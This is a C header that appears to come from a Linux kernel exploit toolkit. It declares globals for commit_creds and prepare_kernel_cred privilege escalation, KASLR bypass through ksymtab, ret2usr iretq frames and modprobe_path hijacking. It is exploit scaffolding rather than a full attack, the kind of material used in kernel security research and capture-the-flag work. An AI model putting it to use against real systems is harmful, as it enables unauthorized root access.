#ifndef GLOBALS_H
#define GLOBALS_H

#include "kcred.h"
#include "ret2usr.h"
#include <stdint.h>

#ifdef DEFINE_GLOBALS
    #define GLOBAL_VAR(type, name, value) type name = value;
#else
    #define GLOBAL_VAR(type, name, value) extern type name;
#endif

/* ============= Kcreds ============= */
/* commit_creds(prepare_kernel_cred(o)); */
GLOBAL_VAR(uintptr_t, COMMIT_CREDS_ADDR, 0);
GLOBAL_VAR(uintptr_t, PREPARE_KERNEL_CRED_ADDR, 0);
GLOBAL_VAR(uintptr_t, POST_PRIVESC_JUMP_ADDR, 0);
/* Use __ksymtab_xxxxxx to bypass KASLR */
GLOBAL_VAR(uintptr_t, KSYMTAB_COMMIT_CREDS_ADDR, 0);
GLOBAL_VAR(uintptr_t, KSYMTAB_PREPARE_KERNEL_CRED_ADDR, 0);


/* ============= iretq ============= */
#ifdef DEFINE_GLOBALS
/* Saved userland context */
iretq_user_ctx_t IRETQ_USER_CTX = {0};
/* Prepare a stack frame to store
 *      the required values beforre returning to user space
 *      in order
 *
 * The values on this stack frame
 *      will be pushed onto the corresponding registers:
 *      RIP, CS, RFLAGS, RSP, SS
 *      for iretq to use
 */
__attribute__((aligned(16))) uintptr_t IRETQ_FRAME[5] = {0};
#else
extern iretq_user_ctx_t IRETQ_USER_CTX;
extern __attribute__((aligned(16))) uintptr_t IRETQ_FRAME[5];
#endif

/* ============= ret2dir ============= */
/* Abuse call_modprobe by hijacking modprobe_path */
GLOBAL_VAR(uintptr_t, MODPORBE_PATH_ADDR, 0);





#endif

